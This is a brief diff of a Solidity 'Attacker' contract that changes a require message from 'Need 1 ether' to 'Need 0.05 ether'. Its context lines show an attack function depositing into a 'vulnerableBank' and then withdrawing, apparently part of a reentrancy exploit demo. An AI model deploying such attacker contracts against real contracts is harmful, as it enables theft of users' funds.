@@ -11,7 +11,7 @@ contract Attacker {
     }
 
     function attack() public payable {
-        require(msg.value >= ATTACK_AMOUNT, "Need 1 ether");
+        require(msg.value >= ATTACK_AMOUNT, "Need 0.05 ether");
 
         vulnerableBank.deposit{value: ATTACK_AMOUNT}();
         vulnerableBank.withdraw();
